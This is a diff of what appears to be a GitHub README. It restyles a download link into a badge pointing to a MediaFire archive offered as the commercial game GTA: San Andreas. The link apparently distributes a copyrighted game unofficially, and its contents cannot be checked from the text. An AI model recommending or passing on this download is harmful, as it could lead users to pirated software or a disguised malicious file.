@@ -24,7 +24,15 @@ https://github.com/user-attachments/assets/3bcd9007-6b26-46f4-b51b-c18dfc5c1e31
 
 ## 📥 DOWNLOAD
 
-[⬇️ Download GTA: San Andreas](https://www.mediafire.com/file/fwfurwcmfohyzvg/Gtasa.7z/file)
+<p align="center">
+  <a href="https://www.mediafire.com/file/fwfurwcmfohyzvg/Gtasa.7z/file" target="_blank">
+    <img src="https://img.shields.io/badge/⬇️_Download-GTA%20San%20Andreas-ff3d00?style=for-the-badge&logo=download&logoColor=white" alt="Download GTA: San Andreas" />
+  </a>
+</p>
+
+<p align="center">
+  <strong>Mirror:</strong> MediaFire
+</p>
 
 ## 🕹️ REQUIREMENTS
 
